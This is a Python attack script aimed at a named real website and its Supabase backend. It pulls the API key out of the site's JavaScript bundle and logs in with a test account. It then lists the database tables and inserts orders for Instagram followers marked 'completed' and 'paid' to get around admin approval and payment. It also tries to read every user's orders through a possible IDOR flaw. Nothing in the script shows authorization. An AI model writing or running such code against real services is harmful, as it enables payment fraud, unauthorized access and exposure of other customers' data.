#!/usr/bin/env python3
"""Explore service purchase flow and try to bypass admin approval."""
import urllib.request, json, re, http.client

SUPABASE_URL = "https://xvdibouzxfynsxgrmffb.supabase.co"
EMAIL = "taskkita.test.7788@web-library.net"
PASSWORD = "TestPass789!"

# Login
req = urllib.request.Request("https://taskkita.com/assets/index-CdJ2nOzM.js",
    headers={"User-Agent": "Mozilla/5.0"})
resp = urllib.request.urlopen(req, timeout=15)
keys = re.findall(r'["\x27](eyJ[a-zA-Z0-9_-]+[.][a-zA-Z0-9_-]+[.][a-zA-Z0-9_-]+)["\x27]',
    resp.read().decode(errors="replace"))
SUPABASE_KEY = keys[0]

conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
payload = json.dumps({"email": EMAIL, "password": PASSWORD})
h = {"Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
conn.request("POST", "/auth/v1/token?grant_type=password", body=payload, headers=h)
body = json.loads(conn.getresponse().read().decode())
conn.close()
access_token = body.get("access_token", "")
user_id = body.get("user", {}).get("id", "")

h2 = {"Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": f"Bearer {access_token}",
      "Accept": "application/json", "Prefer": "return=representation"}

# 1. First check what services/products are available
print("=== 1. AVAILABLE SERVICES ===")
tables = ["services", "products", "campaign_templates", "pricing_tiers", "service_categories"]
for t in tables:
    try:
        conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
        conn.request("GET", f"/rest/v1/{t}?select=*&limit=20", headers=h2)
        r = conn.getresponse()
        body = r.read().decode()
        conn.close()
        if r.status == 200 and len(body) > 5:
            data = json.loads(body)
            print(f"\n  {t} ({len(data if isinstance(data,list) else [data])} items):")
            print(f"  {json.dumps(data if isinstance(data,list) else [data], indent=2)[:1000]}")
        elif r.status == 200:
            print(f"\n  {t}: (empty)")
    except Exception as e:
        print(f"\n  {t}: {str(e)[:50]}")

# 2. Check the campaigns page for what forms are available
print("\n=== 2. CAMPAIGN PAGE ===")
try:
    conn = http.client.HTTPSConnection("taskkita.com")
    conn.request("GET", "/campaigns", headers={"User-Agent": "Mozilla/5.0", "Cookie": f"sb-auth-token={access_token}"})
    r = conn.getresponse()
    html = r.read().decode(errors="replace")
    conn.close()
    # Extract form structure
    import re
    forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', html)
    inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*', html)
    
    # Look for all the interesting strings in the page
    texts = re.findall(r'>([^<]{5,200})<', html)
    for t in texts[:50]:
        clean = re.sub(r'&[a-z]+;', ' ', t).strip()
        if clean and any(x in clean.lower() for x in ["followers", "likes", "views", "instagram", "tiktok", "rm", "price", "harga", "buy", "beli", "order", "pesan", "service", "servis", "task", "tugas"]):
            print(f"  {clean[:200]}")
except Exception as e:
    print(f"  Error: {e}")

# 3. Try to find orders/tasks tables and auto-approve
print("\n=== 3. TRYING AUTO-APPROVE ORDERS ===")
# Try the known tables
for table in ["orders", "tasks", "campaigns", "service_orders", "purchases"]:
    try:
        # First create one
        conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
        conn.request("POST", f"/rest/v1/{table}", json.dumps({
            "user_id": user_id,
            "type": "followers",
            "platform": "instagram",
            "quantity": 100,
            "amount": 50.00,
            "status": "completed",
            "payment_status": "paid"
        }), headers=h2)
        r = conn.getresponse()
        body = r.read().decode()
        conn.close()
        print(f"  POST {table}: {r.status} - {body[:100]}")
        
        if r.status == 201:
            # Try to get all orders (maybe IDOR?)
            conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
            conn.request("GET", f"/rest/v1/{table}?select=*&limit=50", headers=h2)
            r = conn.getresponse()
            body = r.read().decode()
            data = json.loads(body) if body.strip() else []
            conn.close()
            if isinstance(data, list) and len(data) > 0:
                print(f"  Found {len(data)} records in {table}")
                for d in data[:5]:
                    print(f"    {json.dumps(d, indent=2)[:200]}")
    except Exception as e:
        pass
